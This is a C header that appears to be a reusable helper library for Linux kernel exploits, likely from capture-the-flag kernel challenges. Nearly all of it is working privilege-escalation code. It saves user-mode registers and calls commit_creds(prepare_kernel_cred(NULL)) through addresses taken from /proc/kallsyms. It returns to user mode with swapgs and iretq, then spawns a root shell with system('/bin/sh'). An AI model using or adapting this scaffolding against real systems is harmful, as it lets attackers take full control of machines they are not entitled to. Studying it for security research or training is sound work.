#ifndef __SNIPPET_H__
#define __SNIPPET_H__

#include "common.h"

int devfd = -1;

void write_to_dev(char *buf, i32 sz) {
    ACT("write %x byte to dev from buf %p", sz, (void *)buf);
    int r = write(devfd, buf, sz);
    assert_eq(r, sz);
}

void read_from_dev(char *buf, i32 sz) {
    ACT("read %x byte from dev to buf %p", sz, (void *)buf);
    int r = read(devfd, buf, sz);
    assert_eq(r, sz);
}

void open_dev(const char *dev, int oflag) {
    devfd = open(dev, oflag);
    if(devfd == -1)
        PANIC("open %s failed", dev);
}

u64 _cs, _ss, _sp, _rflags;

void save_state() {

    asm volatile (
        ".intel_syntax noprefix;"
        "mov _cs, cs;"
        "mov _ss, ss;"
        "mov _sp, rsp;"
        "pushf;"
        "pop _rflags;"
        ".att_syntax;"
    );

  OK("save_state done");
}

void get_root_shell() {

    if(getuid() == 0) {
        OK("root now");
        system("/bin/sh");
    }else {
        FATAL("escalate failed");
    }
}

static void restore_state() {
    /*
    k_rsp -> u_rip
             u_cs
             u_rflags
             u_rsp
             u_ss
    */
    assert_neq(_sp, 0);
    asm volatile(
        ".intel_syntax noprefix;"
        "swapgs;"
        "mov qword ptr [rsp+0x20], %0;"
        "mov qword ptr [rsp+0x18], %1;"
        "mov qword ptr [rsp+0x10], %2;"
        "mov qword ptr [rsp+0x08], %3;"
        "mov qword ptr [rsp+0x00], %4;"
        "iretq;"
        ".att_syntax;"
        : 
        : "r"(_ss),
          "r"(_sp),
          "r"(_rflags),
          "r"(_cs),
          "r"(get_root_shell)
    );
    OK("restore_state done");
}
void get_root(u64 pkc, u64 cc) {
    /*
        / # grep prepare_kernel_cred /proc/kallsyms 
        / # grep commit_cred /proc/kallsyms 
    */
    (* (int * (*)(void *))cc)((* (void *(*)(void *))pkc)(NULL));
    restore_state();
}
#endif /* __SNIPPET_H__ */